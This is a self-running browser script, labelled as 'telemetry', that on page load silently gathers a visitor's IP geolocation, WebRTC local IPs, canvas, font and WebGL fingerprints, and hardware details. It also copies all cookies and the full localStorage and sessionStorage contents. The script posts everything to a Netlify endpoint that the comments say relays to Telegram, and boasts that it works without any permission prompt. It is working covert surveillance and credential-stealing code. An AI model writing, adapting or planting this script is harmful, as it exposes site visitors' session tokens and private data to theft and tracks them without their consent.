(() => {
  "use strict";

  const ENDPOINT = "/.netlify/functions/telemetry";
  let sent = false;

  // ============================================================
  // 1. IP GEOLOCATION (ipapi.co – Free, No API Key Required)
  //    Returns: ip, city, region, country, postal, lat, lng,
  //    timezone, utc_offset, currency, asn, org, isp, etc.
  //    Similar to ip2location.com output.
  // ============================================================
  async function fetchIPGeolocation() {
    try {
      const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
      const data = await res.json();
      return {
        ip: data.ip || "unavailable",
        city: data.city || "unavailable",
        region: data.region || "unavailable",
        region_code: data.region_code || "unavailable",
        country: data.country_name || "unavailable",
        country_code: data.country || "unavailable",
        country_code_iso3: data.country_code_iso3 || "unavailable",
        country_capital: data.country_capital || "unavailable",
        country_tld: data.country_tld || "unavailable",
        continent_code: data.continent_code || "unavailable",
        in_eu: data.in_eu || false,
        postal: data.postal || "unavailable",
        latitude: data.latitude || "unavailable",
        longitude: data.longitude || "unavailable",
        timezone: data.timezone || "unavailable",
        utc_offset: data.utc_offset || "unavailable",
        currency: data.currency || "unavailable",
        currency_name: data.currency_name || "unavailable",
        languages: data.languages || "unavailable",
        country_area: data.country_area || "unavailable",
        country_population: data.country_population || "unavailable",
        asn: data.asn || "unavailable",
        org: data.org || "unavailable",
        isp: data.isp || "unavailable"
      };
    } catch (_) {
      return { error: "IP geolocation fetch failed" };
    }
  }

  // ============================================================
  // 2. DEVICE HINTS (User-Agent Client Hints – High Entropy)
  // ============================================================
  async function deviceHints() {
    const d = navigator.userAgentData;
    if (!d) return {};
    const out = {
      brands: Array.isArray(d.brands) ? d.brands : [],
      mobile: !!d.mobile,
      platform: d.platform || null
    };
    if (typeof d.getHighEntropyValues === "function") {
      try {
        Object.assign(out, await d.getHighEntropyValues([
          "model", "platformVersion", "fullVersionList", "architecture",
          "bitness", "wow64", "uaFullVersion"
        ]));
      } catch (_) {}
    }
    return out;
  }

  // ============================================================
  // 3. BROWSER FINGERPRINT (Canvas – No Permission)
  // ============================================================
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement("canvas");
      canvas.width = 256;
      canvas.height = 128;
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 16, 16);
      ctx.fillStyle = "#069";
      ctx.textBaseline = "alphabetic";
      ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("The quick brown fox jumps over the lazy dog", 4, 45);
      ctx.fillStyle = "#ff6";
      ctx.fillRect(200, 60, 40, 40);
      return canvas.toDataURL();
    } catch (_) {
      return "not available";
    }
  }

  // ============================================================
  // 4. INSTALLED FONTS (Font Enumeration – No Permission)
  // ============================================================
  function getInstalledFonts() {
    const baseFonts = ["monospace", "sans-serif", "serif"];
    const testFonts = [
      "Arial", "Verdana", "Times New Roman", "Courier New",
      "Georgia", "Comic Sans MS", "Impact", "Tahoma",
      "Trebuchet MS", "Lucida Console", "Helvetica", "Calibri",
      "Cambria", "Garamond", "Roboto", "Noto Sans", "Open Sans",
      "Lato", "Montserrat", "Oswald", "Raleway", "Poppins"
    ];
    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      const txt = "mmmmmmmmmmlli";
      const size = "72px";
      ctx.font = size + " " + baseFonts[0];
      const base = ctx.measureText(txt).width;
      const installed = [];
      for (const f of testFonts) {
        ctx.font = size + ' "' + f + '", ' + baseFonts[0];
        const w = ctx.measureText(txt).width;
        if (w !== base) installed.push(f);
      }
      return installed;
    } catch (_) {
      return [];
    }
  }

  // ============================================================
  // 5. BATTERY (No Permission Required)
  // ============================================================
  async function getBatteryInfo() {
    if (!navigator.getBattery) return { level: "not available", charging: "not available" };
    try {
      const b = await navigator.getBattery();
      return {
        level: Math.round(b.level * 100) + "%",
        charging: b.charging ? "Yes" : "No",
        chargingTime: b.chargingTime === Infinity ? "N/A" : b.chargingTime + "s",
        dischargingTime: b.dischargingTime === Infinity ? "N/A" : b.dischargingTime + "s"
      };
    } catch (_) {
      return { level: "blocked", charging: "blocked" };
    }
  }

  // ============================================================
  // 6. LOCAL IP (WebRTC Leak – No Permission)
  // ============================================================
  function getLocalIPs() {
    return new Promise((resolve) => {
      const ips = [];
      try {
        const pc = new RTCPeerConnection({
          iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });
        pc.createDataChannel("test");
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .catch(() => {});
        pc.onicecandidate = (event) => {
          if (!event || !event.candidate) {
            resolve(ips.length > 0 ? ips : ["not available"]);
            pc.close();
            return;
          }
          const candidate = event.candidate.candidate;
          if (candidate) {
            const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
            if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
          }
        };
        setTimeout(() => {
          resolve(ips.length > 0 ? ips : ["timed out"]);
          pc.close();
        }, 3000);
      } catch (e) {
        resolve(["WebRTC blocked"]);
      }
    });
  }

  // ============================================================
  // 7. BROWSER & DEVICE PARSING (from User-Agent)
  // ============================================================
  function parseUA(ua) {
    const uaLower = ua.toLowerCase();
    let browser = "not exposed";
    let browserVersion = "not exposed";
    let os = "not exposed";
    let osVersion = "not exposed";

    // Browser detection
    if (uaLower.includes("chrome") && !uaLower.includes("edg") && !uaLower.includes("opr")) {
      browser = "Chrome";
      const m = ua.match(/Chrome\/([\d.]+)/);
      if (m) browserVersion = m[1];
    } else if (uaLower.includes("safari") && !uaLower.includes("chrome") && !uaLower.includes("edg")) {
      browser = "Safari";
      const m = ua.match(/Version\/([\d.]+)/);
      if (m) browserVersion = m[1];
    } else if (uaLower.includes("firefox")) {
      browser = "Firefox";
      const m = ua.match(/Firefox\/([\d.]+)/);
      if (m) browserVersion = m[1];
    } else if (uaLower.includes("edg")) {
      browser = "Edge";
      const m = ua.match(/Edg\/([\d.]+)/);
      if (m) browserVersion = m[1];
    } else if (uaLower.includes("opr") || uaLower.includes("opera")) {
      browser = "Opera";
      const m = ua.match(/OPR\/([\d.]+)/);
      if (m) browserVersion = m[1];
    }

    // OS detection
    if (/android/i.test(ua)) {
      os = "Android";
      const m = ua.match(/Android\s([\d.]+)/);
      if (m) osVersion = m[1];
    } else if (/iphone|ipad|ipod/i.test(ua)) {
      os = "iOS";
      const m = ua.match(/iPhone OS\s([\d_]+)/);
      if (m) osVersion = m[1].replace(/_/g, ".");
    } else if (/windows nt/i.test(ua)) {
      os = "Windows";
      const m = ua.match(/Windows NT\s([\d.]+)/);
      if (m) osVersion = m[1] === "10.0" ? "10/11" : m[1];
    } else if (/mac os x/i.test(ua)) {
      os = "macOS";
      const m = ua.match(/Mac OS X\s([\d_]+)/);
      if (m) osVersion = m[1].replace(/_/g, ".");
    } else if (/linux/i.test(ua)) {
      os = "Linux";
    }

    return { browser, browserVersion, os, osVersion };
  }

  // ============================================================
  // 8. MASTER COLLECTOR – A to Z Data
  // ============================================================
  async function collectAllData() {
    const ua = navigator.userAgent || "";
    const parsed = parseUA(ua);
    const hints = await deviceHints();
    const geo = await fetchIPGeolocation();
    const localIPs = await getLocalIPs();
    const battery = await getBatteryInfo();
    const canvas = getCanvasFingerprint();
    const fonts = getInstalledFonts();

    // Device model from hints or UA
    let model = hints.model || "not exposed";
    if (model === "not exposed" || model === "") {
      if (/android/i.test(ua)) {
        const m = ua.match(/Android\s[\d.]+;\s([^;)]+)/);
        if (m) model = m[1].trim();
      } else if (/iphone/i.test(ua)) model = "iPhone";
      else if (/ipad/i.test(ua)) model = "iPad";
      else if (/macintosh/i.test(ua)) model = "Mac";
      else if (/windows nt/i.test(ua)) model = "Windows PC";
      else if (/linux/i.test(ua)) model = "Linux PC";
    }

    // Device brand
    let brand = "not exposed";
    if (/samsung/i.test(ua)) brand = "Samsung";
    else if (/xiaomi/i.test(ua)) brand = "Xiaomi";
    else if (/vivo/i.test(ua)) brand = "vivo";
    else if (/oneplus/i.test(ua)) brand = "OnePlus";
    else if (/google/i.test(ua)) brand = "Google";
    else if (/apple/i.test(ua) && /iphone|ipad|mac/i.test(ua)) brand = "Apple";
    else if (/nokia/i.test(ua)) brand = "Nokia";
    else if (/oppo/i.test(ua)) brand = "Oppo";
    else if (/realme/i.test(ua)) brand = "Realme";
    else if (/huawei/i.test(ua)) brand = "Huawei";
    else if (/nothing/i.test(ua)) brand = "Nothing";

    // Build complete payload
    return {
      timestamp: new Date().toISOString(),

      // ===== IP & GEOLOCATION (ip2location.com style) =====
      ip: geo.ip,
      geolocation: {
        ip: geo.ip,
        city: geo.city,
        region: geo.region,
        region_code: geo.region_code,
        country: geo.country,
        country_code: geo.country_code,
        country_code_iso3: geo.country_code_iso3,
        country_capital: geo.country_capital,
        country_tld: geo.country_tld,
        continent_code: geo.continent_code,
        in_eu: geo.in_eu,
        postal: geo.postal,
        latitude: geo.latitude,
        longitude: geo.longitude,
        timezone: geo.timezone,
        utc_offset: geo.utc_offset,
        currency: geo.currency,
        currency_name: geo.currency_name,
        languages: geo.languages,
        country_area: geo.country_area,
        country_population: geo.country_population,
        asn: geo.asn,
        org: geo.org,
        isp: geo.isp
      },

      // ===== NETWORK =====
      network: {
        localIPs: localIPs,
        publicIP: geo.ip,
        isp: geo.isp,
        asn: geo.asn,
        org: geo.org
      },

      // ===== DEVICE =====
      device: {
        brand: brand,
        model: model,
        platform: hints.platform || parsed.os,
        platformVersion: hints.platformVersion || parsed.osVersion,
        mobile: hints.mobile || /mobile/i.test(ua),
        architecture: hints.architecture || "not exposed",
        bitness: hints.bitness || "not exposed",
        wow64: hints.wow64 || false
      },

      // ===== BROWSER =====
      browser: {
        name: parsed.browser,
        version: parsed.browserVersion,
        userAgent: ua,
        fullVersion: hints.uaFullVersion || "not exposed",
        brands: hints.brands || []
      },

      // ===== DISPLAY =====
      display: {
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        screenPixelDepth: screen.pixelDepth,
        viewportWidth: window.innerWidth,
        viewportHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        devicePixelRatio: window.devicePixelRatio || 1,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        orientation: screen.orientation ? screen.orientation.type : "not available",
        touchPoints: navigator.maxTouchPoints || 0,
        touchSupported: "ontouchstart" in window || navigator.maxTouchPoints > 0
      },

      // ===== LOCALE =====
      locale: {
        language: navigator.language || "unknown",
        languages: Array.isArray(navigator.languages) ? navigator.languages : [],
        timezone: (() => {
          try { return Intl.DateTimeFormat().resolvedOptions().timeZone || null; }
          catch (_) { return null; }
        })(),
        utcOffset: new Date().getTimezoneOffset()
      },

      // ===== STORAGE =====
      storage: {
        cookies: document.cookie || "none",
        localStorage: (() => {
          try { return { ...localStorage }; } catch (_) { return {}; }
        })(),
        sessionStorage: (() => {
          try { return { ...sessionStorage }; } catch (_) { return {}; }
        })(),
        indexedDB: "available" in window.indexedDB,
        cookieEnabled: navigator.cookieEnabled
      },

      // ===== FINGERPRINTS =====
      fingerprints: {
        canvas: canvas,
        fonts: fonts,
        webgl: (() => {
          try {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return "not available";
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (!debugInfo) return "not available";
            return {
              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
          } catch (_) { return "not available"; }
        })(),
        audio: (() => {
          try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.frequency.value = 440;
            osc.start(0);
            osc.stop(0.1);
            return "available";
          } catch (_) { return "not available"; }
        })()
      },

      // ===== HARDWARE =====
      hardware: {
        cpuCores: navigator.hardwareConcurrency || "not available",
        deviceMemory: navigator.deviceMemory || "not available (Chrome only)",
        battery: battery,
        maxTouchPoints: navigator.maxTouchPoints || 0
      },

      // ===== PAGE =====
      page: {
        referrer: document.referrer || "none",
        url: location.href,
        origin: location.origin,
        pathname: location.pathname,
        hostname: location.hostname,
        protocol: location.protocol,
        hash: location.hash || "none"
      },

      // ===== CONNECTION =====
      connection: (() => {
        try {
          const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if (!c) return { type: "not available" };
          return {
            type: c.type || "not available",
            effectiveType: c.effectiveType || "not available",
            rtt: c.rtt || "not available",
            downlink: c.downlink || "not available",
            saveData: c.saveData || false
          };
        } catch (_) {
          return { type: "not available" };
        }
      })(),

      // ===== DO NOT TRACK =====
      doNotTrack: navigator.doNotTrack || "unspecified"
    };
  }

  // ============================================================
  // 9. FORMAT MESSAGE – Professional Structured Output
  // ============================================================
  function formatMessage(data) {
    const lines = [];
    const g = data.geolocation || {};
    const d = data.device || {};
    const b = data.browser || {};
    const dis = data.display || {};
    const loc = data.locale || {};
    const s = data.storage || {};
    const fp = data.fingerprints || {};
    const hw = data.hardware || {};
    const p = data.page || {};
    const conn = data.connection || {};
    const net = data.network || {};

    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("            📡 VISITOR TELEMETRY");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("");
    lines.push("⏱  Timestamp: " + data.timestamp);
    lines.push("");

    // ---- IP & GEOLOCATION ----
    lines.push("┌── IP & GEOLOCATION");
    lines.push("│");
    lines.push("│  🌐 IP Address: " + g.ip);
    lines.push("│  🏙️  City: " + g.city);
    lines.push("│  🗺️  Region: " + g.region + " (" + g.region_code + ")");
    lines.push("│  🌍 Country: " + g.country + " (" + g.country_code + " / " + g.country_code_iso3 + ")");
    lines.push("│  🏛️  Capital: " + g.country_capital);
    lines.push("│  📮 Postal Code: " + g.postal);
    lines.push("│  📍 Coordinates: " + g.latitude + ", " + g.longitude);
    lines.push("│  🕐 Timezone: " + g.timezone + " (UTC" + g.utc_offset + ")");
    lines.push("│  💰 Currency: " + g.currency + " (" + g.currency_name + ")");
    lines.push("│  🗣️  Languages: " + g.languages);
    lines.push("│  📐 Area: " + g.country_area + " km²");
    lines.push("│  👥 Population: " + g.country_population);
    lines.push("│  🌐 Continent: " + g.continent_code + (g.in_eu ? " (EU)" : ""));
    lines.push("│");
    lines.push("│  ─── Network ───");
    lines.push("│  🔌 ISP: " + net.isp);
    lines.push("│  🏢 ASN: " + net.asn);
    lines.push("│  🏛️  Organization: " + net.org);
    lines.push("│  🔗 Local IPs: " + (net.localIPs || []).join(", "));
    lines.push("└──");

    // ---- DEVICE ----
    lines.push("");
    lines.push("┌── DEVICE");
    lines.push("│");
    lines.push("│  🏷️  Brand: " + d.brand);
    lines.push("│  📱 Model: " + d.model);
    lines.push("│  ⚙️  Platform: " + d.platform + " " + d.platformVersion);
    lines.push("│  🧠 Architecture: " + d.architecture);
    lines.push("│  📊 Bitness: " + d.bitness);
    lines.push("│  📱 Mobile: " + (d.mobile ? "Yes" : "No"));
    lines.push("│  💻 64-bit WOW: " + (d.wow64 ? "Yes" : "No"));
    lines.push("└──");

    // ---- BROWSER ----
    lines.push("");
    lines.push("┌── BROWSER");
    lines.push("│");
    lines.push("│  🌐 Browser: " + b.name + " " + b.version);
    lines.push("│  📄 Full Version: " + b.fullVersion);
    lines.push("│  🔍 User-Agent: " + b.userAgent);
    if (b.brands && b.brands.length) {
      lines.push("│  🏷️  Brands: " + b.brands.map(x => x.brand + " v" + x.version).join(", "));
    }
    lines.push("└──");

    // ---- DISPLAY ----
    lines.push("");
    lines.push("┌── DISPLAY");
    lines.push("│");
    lines.push("│  🖥️  Screen: " + dis.screenWidth + " × " + dis.screenHeight);
    lines.push("│  📐 Available: " + dis.availWidth + " × " + dis.availHeight);
    lines.push("│  👁️  Viewport: " + dis.viewportWidth + " × " + dis.viewportHeight);
    lines.push("│  🖼️  Outer: " + dis.outerWidth + " × " + dis.outerHeight);
    lines.push("│  🔍 Pixel Ratio: " + dis.devicePixelRatio);
    lines.push("│  🎨 Color Depth: " + dis.screenColorDepth + " bit");
    lines.push("│  🖱️  Touch Points: " + dis.touchPoints);
    lines.push("│  📱 Touch Supported: " + (dis.touchSupported ? "Yes" : "No"));
    lines.push("│  🔄 Orientation: " + dis.orientation);
    lines.push("└──");

    // ---- LOCALE ----
    lines.push("");
    lines.push("┌── LOCALE");
    lines.push("│");
    lines.push("│  🌐 Language: " + loc.language);
    lines.push("│  🌍 Languages: " + (loc.languages || []).join(", "));
    lines.push("│  🕐 Timezone: " + loc.timezone);
    lines.push("│  ⏱️  UTC Offset: " + loc.utcOffset + " minutes");
    lines.push("└──");

    // ---- STORAGE ----
    lines.push("");
    lines.push("┌── STORAGE");
    lines.push("│");
    lines.push("│  🍪 Cookies: " + (s.cookies || "none").substring(0, 200) + (s.cookies && s.cookies.length > 200 ? "..." : ""));
    lines.push("│  🗄️  Cookie Enabled: " + (s.cookieEnabled ? "Yes" : "No"));
    lines.push("│  📦 LocalStorage: " + Object.keys(s.localStorage || {}).length + " keys");
    lines.push("│  📦 SessionStorage: " + Object.keys(s.sessionStorage || {}).length + " keys");
    lines.push("│  🗃️  IndexedDB: " + (s.indexedDB ? "Available" : "Not available"));
    lines.push("└──");

    // ---- FINGERPRINTS ----
    lines.push("");
    lines.push("┌── FINGERPRINTS");
    lines.push("│");
    lines.push("│  🎨 Canvas: " + (fp.canvas ? fp.canvas.substring(0, 60) + "..." : "not available"));
    lines.push("│  🔤 Installed Fonts: " + (fp.fonts || []).join(", "));
    if (fp.webgl && fp.webgl !== "not available") {
      lines.push("│  🎮 WebGL Vendor: " + fp.webgl.vendor);
      lines.push("│  🎮 WebGL Renderer: " + fp.webgl.renderer);
    } else {
      lines.push("│  🎮 WebGL: " + fp.webgl);
    }
    lines.push("│  🔊 Audio Context: " + fp.audio);
    lines.push("└──");

    // ---- HARDWARE ----
    lines.push("");
    lines.push("┌── HARDWARE");
    lines.push("│");
    lines.push("│  🧠 CPU Cores: " + hw.cpuCores);
    lines.push("│  💾 Device Memory: " + hw.deviceMemory + " GB");
    lines.push("│  🔋 Battery: " + (hw.battery ? hw.battery.level + " (Charging: " + hw.battery.charging + ")" : "not available"));
    lines.push("│  🖱️  Max Touch Points: " + hw.maxTouchPoints);
    lines.push("└──");

    // ---- CONNECTION ----
    lines.push("");
    lines.push("┌── NETWORK CONNECTION");
    lines.push("│");
    lines.push("│  📶 Type: " + conn.type);
    lines.push("│  ⚡ Effective Type: " + conn.effectiveType);
    lines.push("│  ⏱️  RTT: " + conn.rtt + " ms");
    lines.push("│  📥 Downlink: " + conn.downlink + " Mbps");
    lines.push("│  💾 Save Data: " + (conn.saveData ? "Yes" : "No"));
    lines.push("└──");

    // ---- PAGE ----
    lines.push("");
    lines.push("┌── PAGE");
    lines.push("│");
    lines.push("│  🔗 URL: " + p.url);
    lines.push("│  🏠 Origin: " + p.origin);
    lines.push("│  📂 Path: " + p.pathname);
    lines.push("│  🖥️  Host: " + p.hostname);
    lines.push("│  🔐 Protocol: " + p.protocol);
    lines.push("│  ↩️  Referrer: " + p.referrer);
    lines.push("└──");

    // ---- DO NOT TRACK ----
    lines.push("");
    lines.push("┌── PRIVACY");
    lines.push("│");
    lines.push("│  🚫 Do Not Track: " + data.doNotTrack);
    lines.push("└──");

    lines.push("");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    lines.push("✅ Collected without any permission popup.");
    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

    return lines.join("\n");
  }

  // ============================================================
  // 10. SEND TO TELEGRAM VIA NETLIFY
  // ============================================================
  async function sendTelemetry(text) {
    if (sent) return;
    sent = true;
    try {
      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: text }),
        cache: "no-store",
        keepalive: true
      });
    } catch (_) {
      try {
        const blob = new Blob([JSON.stringify({ text: text })], { type: "application/json" });
        navigator.sendBeacon(ENDPOINT, blob);
      } catch (__) {}
    }
  }

  // ============================================================
  // 11. MAIN – AUTO-RUN ON PAGE LOAD
  // ============================================================
  async function run() {
    console.log("🔍 Collecting comprehensive telemetry data...");
    const data = await collectAllData();
    const message = formatMessage(data);
    await sendTelemetry(message);
    console.log("✅ Telemetry sent to Telegram.");
  }

  if (document.readyState === "complete") {
    setTimeout(run, 600);
  } else {
    window.addEventListener("load", () => setTimeout(run, 600));
  }
})();
